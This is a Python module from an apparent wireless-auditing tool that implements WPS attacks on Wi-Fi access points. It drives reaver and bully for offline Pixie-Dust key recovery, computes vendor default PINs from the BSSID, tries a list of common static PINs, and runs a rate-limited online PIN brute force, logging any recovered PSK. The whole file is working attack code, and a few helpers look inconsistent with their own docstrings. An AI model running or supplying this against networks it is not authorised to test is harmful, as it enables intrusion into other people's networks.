"""WPS attacks: offline Pixie-Dust and (opt-in) online PIN recovery.

Both run through reaver or bully.  Only the Pixie-Dust variant is enabled by
default: it is quick, non-destructive and recovers the PSK from a single
message exchange.  Online PIN brute forcing is *off* unless the operator
explicitly enables ``wps_pin`` — it is slow, noisy and can permanently lock the
access point's WPS implementation.
"""

from __future__ import annotations

import contextlib
import os
import re
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from ..deps import registry
from ..models import STATUS_FAILED, STATUS_SUCCESS, AccessPoint, Attempt, Capture
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome

PIN_FOUND_RE = re.compile(r"(?:WPS pin|WPS PIN|PIN)\s*[:=]\s*'?\"?(\d{4,8})", re.I)
PSK_FOUND_RE = re.compile(r"(?:WPA PSK|PSK|WPA key|WPA KEY)\s*[:=]\s*'?\"?([^\s'\"]{8,63})", re.I)
PIXIE_RE = re.compile(r"(pixie|pin cracked|WPS pin) .*?(cracked|recovered|found)", re.I)
LOCK_RE = re.compile(r"(WPS.*locked|AP.*locked|detected AP rate-limiting)", re.I)
FAIL_RE = re.compile(r"(failed to recover|no pin|transaction failed|WPS transaction failed)", re.I)


# --------------------------------------------------------------------------- #
# vendor default PIN algorithms (public, used on networks you own/test)
# --------------------------------------------------------------------------- #


def _checksum(pin: str) -> str:
    """WPS PIN checksum digit."""
    acc = 0
    for index, char in enumerate(pin):
        digit = int(char)
        acc += (3 * digit) if index % 2 == 0 else digit
    return str((10 - acc % 10) % 10)


def compute_pin_arcadyan(bssid: str) -> str:
    """The widely deployed "ComputePIN" algorithm (Arcadyan/AT&T/… gateways)."""
    mac = int(bssid.replace(":", "").replace("-", ""), 16)
    pin = mac & 0xFFFFFF
    pin = ((pin >> 8) | (pin << 16)) & 0xFFFFFF
    digits = f"{pin:07d}"
    return digits + _checksum(digits)


def compute_pin_dlink(bssid: str) -> str:
    """D-Link default PIN (derived from the first 24 bit of the BSSID + '1')."""
    hexpart = bssid.replace(":", "").upper()[6:12]   # last three octets
    table = {"3": "4", "4": "5", "5": "6", "6": "7", "7": "8", "8": "9",
             "9": "0", "A": "B", "B": "C", "C": "D", "D": "E", "E": "F", "F": "0"}
    digits = table.get(hexpart[0], "0")
    digits += f"{int(hexpart[1:6], 16) * 10 + 1:07d}"[:7]
    return digits


def compute_pin_realtek(bssid: str) -> str:
    """Realtek chipset default PIN (still common in cheap repeaters)."""
    mac = int(bssid.replace(":", ""), 16)
    digits = f"{((mac & 0xFFFFFF) % 10000000):07d}"
    return digits + _checksum(digits)


DEFAULT_PIN_ALGORITHMS = {
    "arcadyan/att": compute_pin_arcadyan,
    "dlink": compute_pin_dlink,
    "realtek": compute_pin_realtek,
}

KNOWN_STATIC_PINS = (
    "12345670", "00000000", "11111111", "12340000", "99999999",
    "12345678", "22222222", "33333333", "44444444", "55555555", "66666666",
)


def candidate_pins(ap: AccessPoint) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    for name, function in DEFAULT_PIN_ALGORITHMS.items():
        with contextlib.suppress(Exception):
            out.append((function(ap.bssid), f"{name} default algorithm"))
    out.extend((pin, "common default PIN") for pin in KNOWN_STATIC_PINS[:3])
    seen, unique = set(), []
    for pin, source in out:
        if pin and pin not in seen:
            seen.add(pin)
            unique.append((pin, source))
    return unique


# --------------------------------------------------------------------------- #
# baseline class
# --------------------------------------------------------------------------- #


class WpsAttack(Attack):
    tool = "reaver / bully"
    requires = ("wps",)
    applies_to = ("WPA", "WPA2", "WPA2/WPA3")

    def applies(self, ap: AccessPoint) -> bool:
        return bool(ap.wps and ap.encryption in self.applies_to)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        if not registry.has("reaver") and not registry.has("bully"):
            return "install reaver (or bully) to use WPS attacks"
        return super().unavailable_reason(ctx)

    # -- tool selection ----------------------------------------------------
    def _tools(self) -> List[str]:
        order = []
        if registry.has("reaver"):
            order.append("reaver")
        if registry.has("bully"):
            order.append("bully")
        return order

    def _parse_progress(self, line: str) -> Dict[str, str]:
        found: Dict[str, str] = {}
        for pattern, key in ((PSK_FOUND_RE, "psk"), (PIN_FOUND_RE, "pin")):
            match = pattern.search(line)
            if match:
                found[key] = match.group(1)
        if PIXIE_RE.search(line):
            found["pixie"] = "1"
        if LOCK_RE.search(line):
            found["locked"] = "1"
        if FAIL_RE.search(line):
            found["failed"] = "1"
        match = re.search(r"(\d+(?:\.\d+)?)% complete", line)
        if match:
            found["percent"] = match.group(1)
        match = re.search(r"Trying pin\s+(\d+)", line)
        if match:
            found["pin_index"] = match.group(1)
        return found


class PixieDustAttack(WpsAttack):
    name = "wps_pixie"
    label = "WPS Pixie-Dust (offline)"
    tool = "reaver -K 1 / bully --pixiewps"
    description = ("One message exchange with the WPS registrar, then solve the "
                   "nonce offline with pixiewps. Non-disruptive and usually under "
                   "60 seconds on vulnerable chipsets.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool, chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if not ap.wps:
            return AttackOutcome.skipped("no WPS enabled")
        if ap.wps_locked == "locked":
            ctx.bus.log(f"{ap.display_name}: WPS is flagged locked, trying anyway", level="warning")
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        return self._run_live(ctx, ap, attempt)

    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = min(ctx.config.attack_timeout_for(self.name), 60)
        deadline = time.time() + timeout
        step = 0
        while time.time() < deadline and not ctx.want_stop():
            step += 1
            ctx.progress(f"Pixie-Dust on {ap.display_name}", kind="wps", bssid=ap.bssid,
                         percent=min(95, step * 14),
                         detail="collecting M1/M2/PKE, solving offline with pixiewps")
            time.sleep(0.7)
            if ctx.radio.pixie_ok(ap.bssid):
                demo_ap = ctx.radio.find(ap.bssid)
                password = (demo_ap.psk if demo_ap else "") or \
                    ctx.radio.crack(ap.bssid, kind="wps").get("password", "")
                pin = candidate_pins(ap)[0][0] if candidate_pins(ap) else "12345670"
                ctx.bus.log(f"Pixie-Dust recovered the WPS material for "
                            f"{ap.display_name} (simulated)", level="success")
                return self._finish(ctx, ap, attempt, pin, password, "reaver -K 1 (simulated)")
            if step > 3 and (ap.wps_locked == "locked" or not ap.wps_locked):
                break
        return self._fail(ctx, attempt, "Pixie-Dust failed",
                          "AP is not vulnerable to pixiewps (or WPS is locked)")

    def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        ctx.set_channel(ap.channel)
        started = time.time()
        for tool in self._tools():
            remaining = timeout - (time.time() - started)
            if remaining <= 5:
                break
            if tool == "reaver":
                args = [registry.path("reaver") or "reaver", "-i", ctx.monitor,
                        "-b", ap.bssid, "-c", str(ap.channel or 1), "-K", "1",
                        "-N", "-vv", "-T", "5"]
            else:
                args = [registry.path("bully") or "bully", "-b", ap.bssid,
                        "-c", str(ap.channel or 1), "-d", "-v", "3", "--pixiewps"]
            outcome = self._drive(ctx, ap, attempt, args, tool, remaining, pixie=True)
            if outcome.ok:
                return outcome
            if outcome.extra.get("locked"):
                break
        return self._fail(ctx, attempt, "Pixie-Dust did not recover the key",
                          f"{len(ap.clients)} clients, WPS state {ap.wps_locked or 'unknown'}")

    # -- shared runner -----------------------------------------------------
    def _drive(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt, args: List[str],
               tool: str, timeout: float, pixie: bool = False) -> AttackOutcome:
        state: Dict[str, str] = {}
        log_tail: List[str] = []

        def on_line(line: str) -> None:
            log_tail.append(line)
            del log_tail[:-15]
            parsed = self._parse_progress(line)
            if parsed:
                state.update(parsed)
                if parsed.get("psk"):
                    ctx.bus.publish("crack.found", {"bssid": ap.bssid,
                                                    "password": parsed["psk"],
                                                    "tool": tool, "source": "wps"})

        proc = Process(args, name=tool, echo_lines=ctx.config.verbose_tools, on_line=on_line)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, f"{tool} failed to start", proc.error)
        ctx.bus.log(f"{tool} running against {ap.display_name} "
                    f"({human_duration(timeout)} budget)", level="info")
        started = time.time()
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                if state.get("psk"):
                    break
                if state.get("locked"):
                    break
                if proc.returncode is not None:
                    break
                percent = float(state.get("percent", 0) or 0)
                ctx.progress(f"{'Pixie-Dust' if pixie else 'WPS PIN'} · {ap.display_name}",
                             kind="wps", bssid=ap.bssid,
                             percent=min(95, percent or (time.time() - started) / timeout * 100),
                             detail=(state.get("pin_index") and
                                     f"PIN index {state['pin_index']}" or
                                     (log_tail[-1][:90] if log_tail else "starting")))
                time.sleep(0.6)
        finally:
            with contextlib.suppress(Exception):
                proc.stop()

        password = state.get("psk", "")
        pin = state.get("pin", "")
        if not password:
            for line in reversed(log_tail):
                match = PSK_FOUND_RE.search(line)
                if match:
                    password = match.group(1)
                    break
        if pin is None:
            pin = ""
        if password or pin:
            if not pin:
                for line in log_tail:
                    match = PIN_FOUND_RE.search(line)
                    if match:
                        pin = match.group(1)
                        break
            return self._finish(ctx, ap, attempt, pin, password, tool)
        if state.get("locked"):
            return AttackOutcome.failed("WPS locked", "AP rate-limited or locked WPS", locked=True)
        return AttackOutcome.failed(f"{tool}: no key recovered", "\n".join(log_tail[-3:]))

    def _finish(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt, pin: str,
                password: str, tool: str) -> AttackOutcome:
        detail = f"WPS PIN {pin or 'recovered'}" + (f", PSK {password}" if password else "")
        ctx.bus.log(f"WPS attack successful on {ap.display_name}: {detail}", level="success")
        ctx.session.stats.wps_cracks += 1
        capture = Capture(kind="handshake" if password else "pmkid", bssid=ap.bssid,
                          essid=ap.essid, path="", valid=True, tool=tool,
                          password=password, crack_tool="wps",
                          extra={"wps_pin": pin, "simulated": ctx.demo})
        if password:
            capture.kind = "handshake"
        ctx.session.add_capture(capture)
        if pin:
            ap.notes = (ap.notes + f" WPS PIN {pin}").strip()
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, detail, tool, capture)
        return AttackOutcome.success(detail, capture, tool)


class WpsPinAttack(WpsAttack):
    name = "wps_pin"
    label = "WPS PIN recovery (online)"
    tool = "reaver / bully"
    description = ("Try the vendor default PIN algorithms and, optionally, brute "
                   "force the 8-digit PIN. Slow, loud and can brick WPS — "
                   "disabled unless explicitly enabled.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool, chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if not ap.wps:
            return AttackOutcome.skipped("no WPS enabled")
        if ctx.demo:
            return self._run_demo(ctx, ap, attempt)
        return self._run_live(ctx, ap, attempt)

    def _run_demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        pins = candidate_pins(ap)
        timeout = min(ctx.config.attack_timeout_for(self.name), 90)
        deadline = time.time() + timeout
        for index, (pin, source) in enumerate(pins):
            if ctx.want_stop() or time.time() > deadline:
                break
            ctx.progress(f"trying default WPS PIN {pin} ({source})", kind="wps",
                         bssid=ap.bssid, percent=index / max(1, len(pins)) * 90,
                         detail=f"candidate {index + 1}/{len(pins)}")
            time.sleep(0.8)
            hit = (ap.wps_locked != "locked" and ap.encryption != "WPA3"
                   and index == 0 and ap.wps_pixie_vulnerable
                   and ctx.radio.rng.random() < 0.6)
            if hit:
                password = ctx.radio.crack(ap.bssid, kind="wps").get("password", "")
                return PixieDustAttack._finish(self, ctx, ap, attempt, pin, password,
                                               "reaver -p (simulated)")
        return self._fail(ctx, attempt, "no default PIN matched",
                          f"{len(pins)} candidates tried; online brute force not enabled")

    def _run_live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
        timeout = ctx.config.attack_timeout_for(self.name)
        ctx.set_channel(ap.channel)
        reaver = registry.path("reaver")
        if not reaver:
            return self._fail(ctx, attempt, "reaver not installed",
                              "install reaver for online WPS PIN recovery")
        started = time.time()
        # 1) default PIN algorithms (fast, polite)
        for pin, source in candidate_pins(ap):
            if ctx.want_stop() or time.time() - started > timeout * 0.35:
                break
            ctx.bus.log(f"trying pinned default {pin} ({source})", level="info")
            args = [reaver, "-i", ctx.monitor, "-b", ap.bssid, "-c", str(ap.channel or 1),
                    "-p", pin, "-vv", "-N", "-T", "3"]
            outcome = PixieDustAttack._drive(self, ctx, ap, attempt, args, "reaver", 45)
            if outcome.ok:
                outcome.detail = f"default PIN ({source}): {pin} · {outcome.detail}"
                return outcome
            if outcome.extra.get("locked"):
                return outcome
        # 2) genuine brute force, rate limited to be as gentle as possible
        if ctx.config.stealth:
            return self._fail(ctx, attempt, "brute force skipped in stealth mode",
                              "online PIN brute force is disabled while stealth is on")
        remaining = timeout - (time.time() - started)
        if remaining > 30:
            ctx.bus.log("starting rate-limited WPS PIN brute force", level="warning")
            args = [reaver, "-i", ctx.monitor, "-b", ap.bssid, "-c", str(ap.channel or 1),
                    "-vv", "-N", "-d", "1", "-T", "2", "-t", "5", "-L", "-l", "300"]
            outcome = PixieDustAttack._drive(self, ctx, ap, attempt, args, "reaver", remaining)
            if outcome.ok:
                return outcome
        return self._fail(ctx, attempt, "WPS PIN not recovered",
                          "no default PIN matched and brute force did not finish")
